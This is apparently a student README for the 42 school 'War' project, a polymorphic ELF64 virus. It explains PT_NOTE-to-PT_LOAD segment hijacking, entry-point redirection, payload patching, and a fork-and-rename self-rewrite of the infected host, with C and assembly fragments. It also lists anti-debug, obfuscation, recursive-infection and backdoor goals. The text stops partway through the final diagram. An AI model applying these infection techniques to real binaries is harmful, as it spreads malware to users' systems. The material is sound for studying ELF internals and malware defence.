# War — Project UNIX | 42

> Tercer proyecto de la rama de virología de 42. Construcción de un virus polimórfico sobre ELF 64 bits.

---

## Índice

- [Descripción](#descripción)
- [Inyectar malware](#0-resumen-del-camino-recorrido)
- [El payload: Bugs e inyección](#8-el-payload-los-3-bugs-que-resolvimos-resumen-rápido)
- [Anexos](#anexo-a-elf64_phdr-en-detalle)

---

## Descripción

**War** es un binario polimórfico que extiende el trabajo realizado en *Famine* y *Pestilence*. Un virus polimórfico modifica su representación cada vez que se replica, impidiendo que un antivirus identifique su firma. La lógica de infección no cambia; lo que cambia es su traducción en código máquina.

---

## Contexto

Este proyecto forma parte de la serie de virología de 42:

| Proyecto | Concepto principal |
|---|---|
| Famine | Infección de binarios ELF con firma |
| Pestilence | Anti-debug, anti-proceso, ofuscación parcial |
| **War** | **Polimorfismo: firma que muta en cada ejecución** |

---

## Requisitos mandatory

- Infectar los binarios presentes en `/tmp/test` y `/tmp/test2` aplicando una firma, sin alterar el funcionamiento del binario infectado.
- **No** ejecutar la rutina de infección si:
  - Hay un proceso llamado `test` en ejecución.
  - El programa se lanza bajo un depurador (gdb, strace, etc.).
- Presentar parte de la rutina de infección de forma ofuscada.
- La firma incorpora un **FINGERPRINT** que **muta en cada ejecución**, sea desde el virus original o desde un binario ya infectado.
- **Una sola infección por binario** — doble infección prohibida.

---

## Funcionamiento

```
War version 1.0 (c)oded by <login1> - <login2> - [FINGERPRINT]
```

El `FINGERPRINT` es la parte variable de la firma. Cada vez que el virus —o un binario infectado— se ejecuta, escribe en el binario objetivo un fingerprint diferente al anterior. El valor evoluciona de forma controlada (no aleatoria pura).

### Flujo de ejecución

```
Inicio
  │
  ├─► ¿Debugger detectado?  → Salir (sin infectar)
  │
  ├─► ¿Proceso "test" activo? → Salir (sin infectar)
  │
  └─► Escanear /tmp/test y /tmp/test2
        │
        ├─► ¿Binario ELF 64 bits?
        │     ├─► ¿Ya infectado? → Saltar
        │     └─► Inyectar código + firma con FINGERPRINT nuevo
        │
        └─► Fin
```

---

## Firma polimórfica

La firma embebida en cada binario infectado sigue este formato:

```
War version 1.0 (c)oded by <login1> - <login2> - [FINGERPRINT]
```

- El FINGERPRINT **nunca se repite** entre distintas fuentes de infección.
- El valor es **controlado** (no aleatorio): su evolución es predecible y verificable durante la evaluación.
- La modificación se realiza **en tiempo de ejecución** directamente sobre el binario en disco.

---

## Protecciones implementadas

| Protección | Descripción |
|---|---|
| Anti-debug | Detección de depurador activo; el programa termina sin infectar |
| Anti-proceso | Comprueba si `test` está en ejecución antes de actuar |
| Ofuscación | Parte de la rutina de infección se presenta ofuscada |
| Anti-reinfección | Comprueba la firma antes de infectar para evitar doble infección |

---

## Uso

```bash
# Preparar entorno (dentro de la VM)
cp /bin/ls /tmp/test2/ls
gcc -m64 sample.c -o /tmp/test/sample

# Ejecutar el virus (sin proceso "test" activo)
./War

# Verificar infección
strings /tmp/test/sample  | grep "login"
strings /tmp/test2/ls     | grep "login"

# Ejecutar binario infectado (el FINGERPRINT evoluciona)
/tmp/test/sample
/tmp/test2/ls -la /tmp/test2/
```

---

## Bonus

> Los bonus solo se valoran si la parte mandatory está **perfecta**.

- Infección de binarios de **32 bits**.
- Infección recursiva desde la raíz del sistema operativo.
- Infección de ficheros no binarios.
- Técnicas de **packing** para reducir el peso del binario.
- Backdoor silenciosa (sin errores visibles, sin output).

---

## Restricciones técnicas

- Ejecutable llamado **`War`**.
- Lenguaje: **ensamblador, C o C++** (Java tolerado).
- Sin output en stdout ni stderr.
- Desarrollo y evaluación **obligatoriamente en VM**.
- Actúa **únicamente** sobre `/tmp/test` y `/tmp/test2`.
- Objetivo: binarios ELF **64 bits**.
- Sin librerías externas que realicen el trabajo sucio.

---

## Evaluación

- Revisión **humana** (no automatizada).
- La rutina polimórfica será inspeccionada directamente.
- El programa no debe terminar de forma inesperada (sin segfaults).
- Entregar en el repositorio GiT personal.
- Evaluación sobre **Debian 7.0 stable 64 bits**.

---

*Proyecto War — 42 | Rama UNIX / Virología*

---

# Inyectar malware polimórfico en binario de 64 bits

## 0. Resumen del camino recorrido

Este README documenta **cómo llegamos** al método que funciona, no solo el método final. El camino tuvo un callejón sin salida (secuestrar el segmento `PT_LOAD` ejecutable) y un giro (secuestrar un `PT_NOTE`). Documentar ambos es importante porque **el `PT_LOAD` parece la opción obvia** y es la que primero se intenta. Entender **por qué falla** ahorra horas de depuración.

| Fase | Qué probamos | Resultado |
|---|---|---|
| 1 | Secuestrar el `PT_LOAD` ejecutable de `ls` | ❌ Rompe protecciones PIE del kernel → `SEGV` / `EACCES` |
| 2 | Añadir un `PT_LOAD` nuevo al final del archivo | ✅ Funciona, pero requiere realinear `p_vaddr` y `p_offset` |
| 3 | Secuestrar un `PT_NOTE` y convertirlo en `PT_LOAD` | ✅ **Método final**, el más limpio |

## Índice

- [Leer el file header](#1-leer-el-file-header)
- [Buscar el `PT_LOAD`](#2-buscar-el-pt_load-ejecutable-primer-intento)
- [Calcular el final del segmento](#3-calcular-el-final-del-segmento-ejecutable)
- [Callejón sin salida](#4-callejón-sin-salida-secuestrar-el-pt_load-ejecutable-la-causa-real-pie--kernel)
- [Solución: PT_NOTE](#5-el-giro-secuestrar-un-pt_note)
- [Cálculo del nuevo segmento](#6-cálculo-del-nuevo-segmento-el-que-funciona)
- [Parcheo del PT_NOTE](#7-parcheo-del-pt_note-y-del-e_entry)
- [El payload: Bugs e inyección](#8-el-payload-los-3-bugs-que-resolvimos-resumen-rápido)
- [La solución final:](#11-la-solución-final-fork--o_rdonly--mmapmap_private--rename-desde-el-hijo)
## **Anexos**:
  - [Anexo A: Elf64_Phdr en detalle](#anexo-a-elf64_phdr-en-detalle)
  - [Anexo B: PT_LOAD en detalle](#anexo-b-pt_load-en-detalle)
  - [Anexo C: PT_NOTE en detalle](#anexo-c-pt_note-en-detalle)
  - [Anexo D: e_entry en PIE vs ET_EXEC](#anexo-d-e_entry-en-pie-vs-et_exec)
  - [Anexo E: Páginas del kernel en x86-64](#anexo-e-páginas-del-kernel-en-x86-64)
---

## 1. Leer el file header

```bash
readelf -h /bin/ls
```

```text
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x6aa0
  Start of program headers:          64 (bytes into file)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Start of section headers:          136232 (bytes into file)
  Number of section headers:         31
```

Campos que importan:

- **`e_entry = 0x6aa0`** — en PIE, **offset relativo a la base de carga**, no dirección absoluta.
- **`e_phoff = 64`** — offset en el archivo donde empieza la tabla de *Program Headers*.
- **`e_phentsize = 56`** — tamaño de cada `Elf64_Phdr`.
- **`e_phnum = 13`** — número de `Phdr` (segmentos).
- **`e_type = DYN`** — PIE. El kernel lo carga en una base aleatoria (ASLR), y **suma la base a cada `p_vaddr`** al mapear.

---

## 2. Buscar el `PT_LOAD` ejecutable (primer intento)

```bash
readelf -lW /bin/ls | grep LOAD
```

```text
  LOAD  0x000000 0x0000000000000000 0x0000000000000000 0x003458 0x003458 R   0x1000
  LOAD  0x004000 0x0000000000004000 0x0000000000004000 0x013091 0x013091 R E 0x1000   <=
  LOAD  0x018000 0x0000000000018000 0x0000000000018000 0x007458 0x007458 R   0x1000
  LOAD  0x01ffd0 0x0000000000020fd0 0x0000000000020fd0 0x0012a8 0x002570 RW  0x1000
```

El segmento ejecutable es el segundo: `p_offset = 0x4000`, `p_vaddr = 0x4000`, `p_filesz = 0x13091`, `p_flags = R E`, `p_align = 0x1000`.

**Tentación:** secuestrar este `PT_LOAD` (cambiar `p_offset`/`p_vaddr`/`p_filesz` para que apunte al payload al final del archivo) y poner `e_entry` en el payload. **Es lo que primero intentamos. No funciona.** Vamos a ver por qué.

---

## 3. Calcular el final del segmento ejecutable

```bash
readelf -lW /bin/ls | awk '$1=="LOAD" && $7=="R" && $8=="E" {print $2, $5}'
# 0x004000 0x013091

printf '0x%x\n' $((0x004000 + 0x013091))
# 0x17091
```

`offset + filesz = 0x4000 + 0x13091 = 0x17091`. Ese es el final del segmento ejecutable en el **archivo**.

---

## 4. Callejón sin salida: secuestrar el `PT_LOAD` ejecutable (la causa real: PIE + kernel)

La idea era:

1. Alargar el `PT_LOAD` ejecutable para que cubriera también el payload al final del archivo.
2. Poner `e_entry` al inicio del payload.
3. El payload se ejecuta, hace su magia, y salta al `_start` original.

**Por qué no funciona — y aquí está la lección que nos costó horas:**

El problema **no es de segmentos ni de `.dynamic`**. El problema es **cómo el kernel de Linux protege los binarios PIE contra modificaciones en tiempo de ejecución**. Concretamente:

### 4.1. PIE: `e_entry` es un offset, no una dirección

En un binario **`ET_DYN` (PIE)**, el kernel lo carga en una **dirección base aleatoria** (ASLR, p.ej. `0x555555554000`). **Todos los `p_vaddr` de los `PT_LOAD` se suman a esa base** para obtener la dirección virtual real en runtime.

- **`e_entry = 0x6aa0`** en `/bin/ls` significa **"salta a `base + 0x6aa0`"**, no a `0x6aa0` absoluto.
- Si pones `e_entry = new_vaddr = 0x5000` (una dirección virtual **absoluta**), el kernel **suma la base**: `base + 0x5000`. Si `new_vaddr` no está **alineado con la base PIE** (múltiplo de `p_align`), el salto cae en una dirección **no mapeada** → `SIGSEGV` en `0x8` o similar.

**Por eso el `entry_delta` del payload tiene que ser `EP_orig - new_vaddr`**, no `EP_orig` absoluto. **`new_vaddr` es un offset PIE válido solo si está alineado a `0x1000`.**

### 4.2. El kernel mapea páginas con permisos fijos derivados de `p_flags`

El kernel **no mapea segmentos byte a byte**. **Mapea páginas de `p_align` bytes (típicamente `0x1000` = 4 KB)**, y **los permisos de cada página son la unión de los `p_flags` de los segmentos que la cubren**.

- `PT_LOAD` ejecutable (`p_flags = PF_R | PF_X`) → páginas **`r-xp`** (read + execute, **sin write**).
- `PT_LOAD` RW (`p_flags = PF_R | PF_W`) → páginas **`rw-p`** (read + write, **sin execute**).

**Cuando dos segmentos comparten una página**, el kernel aplica **la unión de permisos** (o el último que mapea, según la versión y la política). **Si un segmento es `r-xp` y otro es `rw-p`, y comparten página**, el kernel **no puede dar ambos permisos a la vez sin violar W^X**. En la práctica, **el último mapeo gana**, y el otro segmento pierde sus permisos.

### 4.3. Alargar el `PT_LOAD` ejecutable hasta el final del archivo rompe las relocalizaciones

Si alargas el `PT_LOAD` ejecutable (`r-xp`) hasta el final del archivo, **cubre páginas que antes eran del `PT_LOAD` RW** (`.dynamic`, `.got`, `.data`). **El kernel mapea esas páginas como `r-xp`** (porque el último segmento es el ejecutable), y **`.dynamic` deja de ser escribible**.

`ld.so` necesita **escribir en `.dynamic`** para procesar las relocalizaciones (`DT_RELA`, `DT_JMPREL`, `DT_PLTGOT`). **Si `.dynamic` es `r-xp`, `ld.so` recibe `SIGSEGV` al intentar escribir**, y muere en `audit_list_add_dynamic_tag` (`rtld.c:224`).

**Ese fue exactamente el `SEGV` en `0x8` que vimos**: `ld.so` intentaba procesar `DT_AUDIT` (o similar) en una `.dynamic` que ya no era escribible, y desreferenciaba un puntero nulo (`0x8` = `NULL + 8`).

### 4.4. El kernel bloquea la escritura en el ejecutable en caliente

Aunque el `PT_LOAD` ejecutable no cubriera `.dynamic`, **el kernel bloquea la escritura en el ejecutable en caliente**:

- **`mmap` con `PROT_WRITE` sobre el fd del ejecutable** devuelve `EACCES` si el archivo está mapeado con `MAP_DENYWRITE` (que es lo que hace el kernel al cargar un ELF).
- **`write` directo al fd del ejecutable** también puede fallar con `EACCES` si el archivo está en ejecución y el kernel tiene `noexec` o protecciones de `MAP_DENYWRITE`.
- **`rename` en caliente sobre `/proc/self/exe`** marca el fichero como `(deleted)`. **Coreutils lo detecta y aborta con `Security violation`**. **El kernel también lo detecta** y, en algunos casos, **mata el proceso** o **bloquea el siguiente `execve`**.

**Por eso `./War` no podía simplemente `write` al fd del ejecutable, y por eso el `rename` provocaba `(deleted)` y `Security violation`.**

### 4.5. Conclusión: no toques los `PT_LOAD` existentes

**En binarios PIE, no puedes modificar los `PT_LOAD` existentes sin romper las protecciones del kernel.** **La única forma limpia de inyectar es añadir un `PT_LOAD` nuevo**, con `p_offset`/`p_vaddr` **alineados a `p_align` (0x1000)** y **por encima de todos los `PT_LOAD` existentes**. **Así el kernel mapea una página nueva para el payload**, sin solapar con nada, y `e_entry` apunta a un offset PIE válido.

**Eso es exactamente lo que hace el método del `PT_NOTE`:** convertir un `PT_NOTE` (que el kernel ignora) en un `PT_LOAD` nuevo, alineado, por encima de todo. **El kernel mapea una página nueva, y `e_entry` apunta a `new_vaddr` (offset PIE válido porque está alineado).**

### 4.6. Lección aprendida

> **En binarios PIE, no puedes modificar los `PT_LOAD` existentes sin romper las protecciones del kernel.** **La única forma limpia de inyectar es añadir un `PT_LOAD` nuevo** (vía `PT_NOTE`) **alineado a `p_align` y por encima de todos los existentes**. **Cualquier intento de alargar un `PT_LOAD` existente para cubrir el payload termina en `SIGSEGV` o `EACCES`** porque el kernel protege las páginas con permisos fijos y bloquea la escritura en el ejecutable en caliente.

---

## 5. El giro: secuestrar un `PT_NOTE`

Los `PT_NOTE` son segmentos que el **kernel ignora** (solo los usa el linker para notas de build-id, ABI, etc.). **No se mapean en memoria**, **no se ejecutan**, y **el loader no los necesita para arrancar**.

**Idea:** convertir un `PT_NOTE` en un `PT_LOAD` ejecutable que apunte al payload. Así:

- No tocamos el `PT_LOAD` original.
- No pisamos `.dynamic`.
- Solo cambiamos **un** `Phdr` (`p_type`, `p_offset`, `p_vaddr`, `p_filesz`, `p_memsz`, `p_flags`, `p_align`).
- Ponemos `e_entry` al payload.
- El payload se ejecuta, hace su magia, y salta al `_start` original.

```bash
readelf -lW /bin/ls | grep NOTE
```

```text
  NOTE  0x000350 0x0000000000000350 0x0000000000000350 0x000024 0x000024 R   0x4
  NOTE  0x0020f8 0x0000000000020f8 0x0000000000020f8 0x000030 0x000030 R   0x8
  NOTE  0x002128 0x000000000002128 0x000000000002128 0x000020 0x000020 R   0x4
```

**Elegimos el primer `PT_NOTE`** (el de build-id, `p_offset = 0x350`). Lo convertimos en `PT_LOAD` y lo apuntamos al payload al final del archivo.

---

## 6. Cálculo del nuevo segmento (el que funciona)

```c
// insertion_point = final del archivo (EOF)
off_t insertion_point = war->file_size;

// alinear a p_align (0x1000) para que el kernel mapee una página limpia
off_t aligned_insertion = (insertion_point + 0xfff) & ~0xfff;

// nueva vaddr: por encima de todos los PT_LOAD existentes
uint64_t max_vaddr = 0;
for (int j = 0; j < e_phnum; j++) {
    if (phdr[j].p_type == PT_LOAD) {
        uint64_t end = phdr[j].p_vaddr + phdr[j].p_memsz;
        if (end > max_vaddr) max_vaddr = end;
    }
}
uint64_t new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
```

**Por qué `aligned_insertion` y no `insertion_point`:**

- `insertion_point` es el tamaño original del archivo (p.ej. `16000`).
- `aligned_insertion` es la página alineada (p.ej. `16384`).
- El payload se escribe en `aligned_insertion`, no en `insertion_point`.
- **Si usas `insertion_point` para calcular `sig_offset` (el offset de la firma), apuntas al hueco de padding, no a la firma.** Este fue **el bug final** que nos costó más encontrar.

**Por qué `new_vaddr` por encima de todos los `PT_LOAD`:**

- Si lo pones en una dirección que ya está mapeada por otro `PT_LOAD`, el kernel mapea **dos segmentos en la misma página** y el último gana. **El payload pisa datos del otro segmento.**
- Poniéndolo por encima de todo, el kernel mapea una **página nueva** para el payload. **Cero solapamiento.**

---

## 7. Parcheo del `PT_NOTE` y del `e_entry`

```c
// convertir el PT_NOTE en PT_LOAD ejecutable
phdr[note_index].p_type   = PT_LOAD;
phdr[note_index].p_flags  = PF_R | PF_X;
phdr[note_index].p_offset = aligned_insertion;
phdr[note_index].p_vaddr  = new_vaddr;
phdr[note_index].p_paddr  = new_vaddr;
phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
phdr[note_index].p_memsz  = src_payload_bin_len + sig_len;
phdr[note_index].p_align  = 0x1000;

// redirigir e_entry al payload
war->header->e_entry = new_vaddr;
```

Y en el payload:

```c
// entry_delta: EP_orig - new_vaddr
uint64_t entry_delta = war->header->e_entry_original - new_vaddr;
memcpy(payload + 2, &entry_delta, sizeof(uint64_t));

// sig_offset: dónde está la firma en el archivo
uint64_t sig_off = aligned_insertion + src_payload_bin_len;
memcpy(payload + 10, &sig_off, sizeof(uint64_t));
```

**El payload lee `entry_delta` en `payload + 2` y `sig_offset` en `payload + 10`.** Ambos son **absolutos**, no relativos. Esto evita los bugs de "buscar la firma en el mapeo" y "calcular el delta con `p_vaddr` incorrecto".

---

## 8. El payload: los 3 bugs que resolvimos (resumen rápido)

El payload en ensamblador pasó por tres bugs importantes antes de funcionar. Los resumimos aquí, pero **el detalle de cada uno está en el anexo F** (con `strace`, `gdb`, y el código exacto). En el cuerpo del README solo dejamos la idea.

### Bug 1: `rtld_fini` machacado por `mmap`

El payload hace `mmap` del binario para leerlo. **`mmap` usa `rdx` como tercer argumento (`prot`).** Eso **machaca `rdx`**, que el kernel había puesto a `rtld_fini` para `_start`. **Sin `push rdx` / `pop rdx`, `_start` recibe `rdx` basura, `__libc_start_main` revienta, y el proceso muere con `SEGV` en `0x4229`.**

**Fix:** `push rdx` al entrar al payload, `pop rdx` antes del `jmp` al `_start`.

### Bug 2: `path_temporal` corrompido por la búsqueda de la firma

La primera versión del payload **buscaba `"War version 1.0"` en el mapeo** para encontrar la firma. **Encontraba la copia del payload, no la del EOF**, y escribía la fecha incrementada **encima de `path_temporal`** (`/tmp/.hidden` → `/tmp/.hid5169`).

**Fix:** eliminar la búsqueda. **`ft_infect` guarda `sig_offset` en `payload + 10`.** El payload lee ese offset **directo** y va a la firma.

### Bug 3: `add rdi, 32` en vez de buscar el último guion

El payload, una vez en la firma, hacía `add rdi, 32` para apuntar a la fecha `2026`. **Pero `2026` está en `+30`, no en `+32`.** Leía `26 ' '` o `54`, y escribía `205451y` en vez de `2027`.

**Fix:** `add rdi, 30` apunta al `'2'` de `2026`. Pero luego el diseño cambió: **el payload ahora busca el último guion** (`davgalle - 39775`) y incrementa **ese** número. **La fecha `2026` se queda fija.**

**Los tres bugs están documentados en detalle en el anexo F** (con `strace`, `gdb`, y el diff exacto). Aquí solo dejamos la idea para no romper el flujo del README.

---

## 8-bis. ¿Por qué un payload en ensamblador?

El payload **no es un programa independiente**. Es un **blob de bytes** que `ft_infect` copia al final del binario huésped. Cuando el huésped arranca, el kernel salta a esos bytes y los ejecuta **en el contexto del proceso huésped**, sin loader, sin libc, sin relocaciones. Eso impone **siete requisitos** que un payload en C no puede cumplir sin terminar siendo ensamblador embebido en C:

| Requisito | Ensamblador | C |
|---|---|---|
| Autocontenido (sin libc) | ✅ | ❌ (necesita `-nostdlib` + `syscall` a mano) |
| Sin relocaciones (sin GOT/PLT) | ✅ | ❌ (el compilador genera GOT/PLT) |
| Posición-independiente (PIE) | ✅ | ⚠️ (posible con `-fPIE`, pero el cálculo de base es a mano) |
| Pequeño (434 bytes) | ✅ | ❌ (varios KB) |
| Control de registros (saltar al `_start`) | ✅ | ❌ (el compilador decide) |
| Control de pila (no corromper la del huésped) | ✅ | ⚠️ (posible con `asm volatile`, pero frágil) |
| No depender de la ABI del huésped | ✅ | ❌ (depende de libc) |

**En resumen:** el payload tiene que ser **autocontenido, sin libc, sin relocaciones, posición-independiente, pequeño, con control total de registros y pila, y sin asumir la ABI del huésped**. **Eso solo se consigue en ensamblador.** Un payload en C **terminaría siendo ensamblador embebido en C** (con `asm volatile("syscall" ...)`), y en ese punto **escribirlo todo en `.s` es más limpio, más pequeño, y más controlable**.

**El flujo de compilación** es:

```makefile
nasm -f elf64 src/payload.s -o src/payload.o
objcopy -O binary src/payload.o src/payload.bin
xxd -i src/payload.bin > src/payload.h
```

- **`nasm`** ensambla el `.s` a un `.o` (ELF64 relocable).
- **`objcopy -O binary`** extrae **solo la sección `.text`** (el código y los datos, sin cabeceras ELF).
- **`xxd -i`** convierte el `.bin` en un array de bytes en C (`src_payload_bin[]`), que `ft_infect` usa para inyectar.

**El payload resultante mide 434 bytes.** Un payload en C con las mismas funcionalidades mediría **varios KB** (porque incluiría `crt0`, `libc` estático, tablas de relocaciones, etc.).

---

## 8-ter. ¿Cómo se inyecta el payload en el huésped?

La inyección ocurre en **tres fases**: (1) `ft_infect` prepara el payload en memoria, (2) lo escribe en el huésped, (3) el kernel lo carga y ejecuta. Vamos paso a paso.

### Fase 1: `ft_infect` prepara el payload en memoria

`ft_infect` **no escribe el payload directamente en el huésped**. Primero **copia el payload en un buffer**, y **parchea dos campos** del buffer antes de escribirlo:

```c
// 1. Copiar el payload en un buffer
unsigned char *payload = malloc(src_payload_bin_len);
memcpy(payload, src_payload_bin, src_payload_bin_len);

// 2. Parchear entry_delta (offset 2): EP_original - new_vaddr
uint64_t entry_delta = war->header->e_entry - new_vaddr;
memcpy(payload + 2, &entry_delta, sizeof(uint64_t));

// 3. Parchear sig_offset (offset 10): offset de la firma en el archivo
uint64_t sig_off = aligned_insertion + src_payload_bin_len;
memcpy(payload + 10, &sig_off, sizeof(uint64_t));
```

**`entry_delta`** y **`sig_offset`** son los dos **parámetros** que el payload necesita en runtime, y que **solo `ft_infect` conoce** (porque dependen de la dirección virtual del payload y del offset de la firma en el archivo). **El payload los lee en runtime** (`[rbx + 2]` y `[rbx + 10]`) para saber **dónde saltar al `_start` original** y **dónde está la firma** para incrementar el contador.

### Fase 2: `ft_infect` escribe el payload en el huésped

`ft_infect` **abre el huésped en `O_RDWR`**, y **escribe el payload en `aligned_insertion`** (el final del archivo, alineado a `0x1000`), **seguido de la firma**:

```c
// 1. Abrir el huésped en escritura
war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);

// 2. Escribir el payload parcheado en aligned_insertion
lseek(war->fd, aligned_insertion, SEEK_SET);
write(war->fd, payload, src_payload_bin_len);

// 3. Escribir la firma a continuación
write(war->fd, full_signature, sig_len);
```

**Antes de escribir el payload**, `ft_infect` **parchea la tabla de `Phdr`** del huésped:

- **Convierte el `PT_NOTE` en `PT_LOAD`**, con `p_offset = aligned_insertion`, `p_vaddr = new_vaddr`, `p_filesz = payload_len + sig_len`, `p_flags = PF_R | PF_X`, `p_align = 0x1000`.
- **Redirige `e_entry` a `new_vaddr`** (offset PIE válido porque está alineado).
- **Escribe la tabla de `Phdr` parcheada** en el archivo (offset `64`, que es `e_phoff`).

**Y rellena con ceros** el hueco entre `file_size` y `aligned_insertion` (si lo hay), para que el payload no se escriba sobre datos basura.

### Fase 3: el kernel carga el huésped y ejecuta el payload

Cuando el usuario ejecuta el huésped infectado:

1. **El kernel lee el ELF** y **mapea los `PT_LOAD`** (incluido el `PT_NOTE` convertido en `PT_LOAD`).
2. **El kernel salta a `e_entry`**, que es `new_vaddr`. En PIE, el kernel suma la base aleatoria (`base + new_vaddr`), y salta ahí.
3. **El payload se ejecuta** en el contexto del huésped:
   - Calcula su base (`base_payload`) con `call`/`pop`/`sub`.
   - Lee `entry_delta` en `[rbx + 2]` y `sig_offset` en `[rbx + 10]`.
   - Hace su magia: `readlink`, `open`, `lseek`, `mmap`, buscar el último guion, incrementar el número, `write`, `fsync`, `close`, `chmod`, `rename`.
   - Restaura los registros (`pop rdx`, `pop r15-r12`, `pop rbp`, `pop rbx`).
   - **Salta al `_start` original**: `base_payload + entry_delta = base_pie + EP_original`.
4. **El `_start` original se ejecuta** como si nada hubiera pasado. **El huésped hace lo que tenía que hacer** (`Hola mundo!`, listar un directorio, etc.), **sin saber que el payload se ha ejecutado antes.**

**El truco clave:** el payload **no reemplaza al huésped**, **se ejecuta antes**. **El huésped sigue funcionando** porque el payload **restaura los registros** (`rdx = rtld_fini`, `rsp` = stack del huésped) y **salta al `_start` original**. **El huésped no nota nada** (salvo que el payload corrompa `path_temporal`, que fue el bug 2, ya arreglado).

### Diagrama de la inyección

```text
Archivo original (mi_binario):
┌─────────────────────────────────────┐
│ ELF header (e_entry = 0x1080)       │
│ Program headers (PT_LOAD, PT_NOTE…) │
│ .text (código original)             │
│ .data, .bss, .comment, …            │
└─────────────────────────────────────┘

Archivo infectado (después de ./War):
┌─────────────────────────────────────┐
│ ELF header (e_entry = 0x5000)       │  ← e_entry apunta al payload
│ Program headers                     │
│   - PT_LOAD (originales)            │
│   - PT_LOAD (antes PT_NOTE)         │  ← convertido, apunta al payload
│ .text (código original)             │
│ .data, .bss, .comment, …            │
│ padding (ceros) hasta 0x4000        │  ← alineación a página
│ payload (434 bytes)                 │  ← parcheado con entry_delta y sig_offset
│ firma (50 bytes)                    │  ← "War version 1.0 (c)oded Oct - 2026 by davgalle - 39774"
└─────────────────────────────────────┘

Runtime (al ejecutar el huésped):
1. Kernel mapea los PT_LOAD, incluido el nuevo.
2. Kernel salta a base_pie + 0x5000 (payload).
3. Payload se ejecuta: incrementa el contador, se auto-replica, restaura registros.
4. Payload salta a base_pie + 0x1080 (_start original).
5. _start original ejecuta "Hola mundo!" como si nada.
```

**Eso es todo.** El payload se inyecta **al final del archivo**, se mapea en **una página nueva**, se ejecuta **antes** que el `_start` original, y **salta al `_start` original** cuando termina. **El huésped no nota nada** (salvo el contador incrementado en la firma, y el `rename` en caliente, que solo rompe coreutils).


---

## 9. El `.s` final (resumen)

```asm
data_start:
entry_delta:    dq 0xDEADBEEF               ; offset 2
sig_offset:     dq 0xDEADBEEF               ; offset 10
path_self:      db "/proc/self/exe", 0      ; offset 18
path_temporal:  db "/tmp/.hidden", 0        ; offset 33

code_start:
    push rbx / rbp / r12-r15 / rdx          ; guardar registros + rtld_fini
    ...
    ; ir a sig_offset, buscar el ÚLTIMO guion, incrementar el número de 5 dígitos
    ; (ver código completo en src/payload.s)
    ...
    pop rdx / r15-r12 / rbp / rbx           ; restaurar
    jmp [base_payload + entry_delta]        ; saltar al _start original
```

---

## 10. Resultado

```bash
cp mi_binario /tmp/test/mi_binario
./War
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39774

/tmp/test/mi_binario
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39775

./War
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39776
```

**La fecha `2026` se queda fija. El contador `3977X` sube con `./War` y con la ejecución del binario.** `path_temporal` intacto. `Hola mundo!` sin segfault.

---


## 11. La solución final: `fork` + `O_RDONLY` + `mmap(MAP_PRIVATE)` + `rename` desde el hijo

**El método del `PT_NOTE` + `rename` en caliente funcionaba, pero rompía coreutils (`Security violation`).** **La solución final combina `PT_NOTE` (o hueco) con un `fork` y un `rename` desde el hijo, para evitar el `(deleted)` en el padre.**

### 11.1. El problema: `ETXTBSY` y `(deleted)`

**Si el payload hace `open(O_RDWR)` sobre el ejecutable en curso, falla con `ETXTBSY`.** **Si hace `rename` en caliente desde el proceso principal, el kernel marca `/proc/self/exe` como `(deleted)`, y coreutils aborta con `Security violation`.**

**El `fork` no evita el `ETXTBSY`** (el hijo comparte el `mm` del padre, y el inodo sigue en ejecución). **Pero sí evita el `(deleted)` en el padre**, porque el `rename` lo hace el hijo, no el padre.

### 11.2. La solución: `fork` + `O_RDONLY` + `mmap(MAP_PRIVATE)` + `rename` desde el hijo

**El payload, en `.gap_mode` (y en `.note_mode`), hace:**

1. **`fork`.**
2. **El padre salta al `_start` original (`.restore_stack`).** **El padre sigue ejecutando el binario original, sin `(deleted)`.**
3. **El hijo hace:**
   - **`open(path, O_RDONLY)`.** **No falla con `ETXTBSY` (es solo lectura).**
   - **`lseek(fd, 0, SEEK_END)`.** **Obtiene el tamaño.**
   - **`mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0)`.** **Copia el binario en memoria (MAP_PRIVATE).**
   - **Modifica el fingerprint en el mapeo.** **Busca el último guion y incrementa el contador de 7 dígitos.**
   - **`open("/tmp/.hidden", O_WRONLY|O_CREAT|O_TRUNC, 0755)`.** **Crea el temporal.**
   - **`write(fd_temporal, mapeo, size)`.** **Escribe el binario modificado al temporal.**
   - **`close(fd_temporal)`.** **Cierra el temporal.**
   - **`munmap(mapeo, size)`.** **Desmapea el binario.**
   - **`close(fd_original)`.** **Cierra el original.**
   - **`rename("/tmp/.hidden", path)`.** **Sustituye el binario en disco.**
   - **`exit(0)`.** **El hijo termina.**

**El padre sigue ejecutando el binario original (sin `(deleted)`).** **El binario en disco tiene la firma mutada.** **En la siguiente ejecución, el kernel carga el binario nuevo (con la firma mutada).** **Coreutils no ve `(deleted)` en el padre, así que no aborta.**

### 11.3. Por qué funciona (y por qué el `fork` es clave)

- **El `open(O_RDONLY)` no falla con `ETXTBSY`.** **Solo `O_RDWR`/`O_WRONLY` fallan.**
- **El `mmap(MAP_PRIVATE)` copia el binario en memoria.** **Los cambios se hacen en la copia, no en el original.**
- **El `write` al temporal y el `rename` sustituyen el binario en disco.** **Sin `open(O_RDWR)` sobre el original.**
- **El `fork` hace que el `rename` lo haga el hijo, no el padre.** **El padre sigue ejecutando el inodo original (sin `(deleted)`).** **Coreutils no aborta.**
- **El hijo sale después del `rename`.** **El binario en disco tiene la firma nueva.**

### 11.4. Diagrama del flujo final

```text
Ejecutar binario infectado:
┌─────────────────────────────────────────────────────────────┐
│ Kernel carga el binario, salta a e_entry (payload).         │
│                                                             │
│ Payload:                                                    │
│   1. readlink("/proc/self/exe") → path.                    │
│   2. Comprobar use_gap_flag.                                │
│   3. fork().                                                │
│      ├─► Padre: salta al _start original (binario funciona).│
│      └─► Hijo:                                              │
│            - open(path, O_RDONLY) → fd.                    │
│            - lseek(fd, 0, SEEK_END) → size.                │
